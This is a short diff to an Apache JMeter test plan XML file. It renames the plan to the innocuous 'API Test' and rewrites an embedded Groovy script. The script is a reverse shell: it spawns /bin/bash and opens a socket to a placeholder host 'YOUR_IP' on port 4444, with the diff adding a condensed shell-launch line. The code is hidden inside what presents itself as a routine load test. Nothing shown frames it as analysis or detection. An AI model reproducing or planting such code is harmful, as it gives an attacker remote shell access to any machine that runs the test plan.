@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
   <hashTree>
-    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="Performance Test" enabled="true">
+    <TestPlan guiclass="TestPlanGui" testclass="TestPlan" testname="API Test" enabled="true">
       <boolProp name="TestPlan.functional_mode">false</boolProp>
     </TestPlan>
     <hashTree>
@@ -19,8 +19,7 @@
           <stringProp name="script">
 def host = "YOUR_IP"
 def port = 4444
-def cmd = ["/bin/bash", "-c", "exec /bin/bash 0>&1"]
-def p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
+def p = ["/bin/bash", "-c", "exec /bin/bash 0>&1"].execute()
 def s = new Socket(host, port)
 def pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
 def po = p.getOutputStream(), so = s.getOutputStream()
